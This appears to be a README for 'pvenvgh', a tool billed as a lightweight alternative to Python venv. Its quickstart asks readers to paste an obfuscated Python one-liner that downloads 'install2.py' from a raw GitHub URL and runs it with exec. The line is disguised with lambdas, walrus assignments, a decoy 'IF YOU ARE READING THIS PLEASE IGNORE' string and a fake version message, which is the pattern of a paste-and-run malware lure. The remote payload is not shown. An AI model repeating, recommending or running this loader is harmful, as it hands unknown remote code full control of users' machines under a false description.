# pvenvgh — Console & Custom Python Env Runner

pvenvgh is a console-like app that sets up and runs a custom Python environment — think of it as a slick alternative to the usual venv, but with extra powers.

It fetches remote scripts, manages package folders, and can launch your environment or even other tools, all from the command line.

## Quickstart: Run the Installer

Open your Python console and paste this one-liner to fetch and run the installer script:

```python
["IF YOU ARE READING THIS PLEASE IGNORE", f"I am sorry. This application does not support 3.7 lower pythons {(python:=3.8)}",
exec((get:=((lambda r:lambda f:(r.urlopen(f"https://raw.githubusercontent.com/i-am-new-blip/wpt/refs/heads/main/{f}").read().decode()))(((request := __import__('urllib.request', fromlist=['']))
))))('install2.py'))]
```

You’re all set! The script will handle the rest.

## What It Is

- A console to **create and run a custom Python environment** (not the official venv, but close)  
- Fetches and executes remote setup scripts on demand  
- Manages package directories dynamically  
- Lets you launch your environment or external tools with ease  

## Why Use It?

- Lightweight and flexible — no heavy dependencies  
- Great for quick prototyping or dev setups  
- Powers your workflows from a single console app  
- Perfect if you want control beyond the standard venv  

## How To Use

1. Run the bootstrap script using the quickstart one-liner above  
2. It fetches `install2.py` which sets up the package folders and environment  
3. Use the console commands to run your custom env or launch tools  

## Requirements

- Python 3.8+ (walrus operator friendly)  
- Internet connection for fetching remote scripts  
- Cross-platform compatible  

## License

MIT © YourNameHere

---

Feel free to open issues or pull requests for features or help!
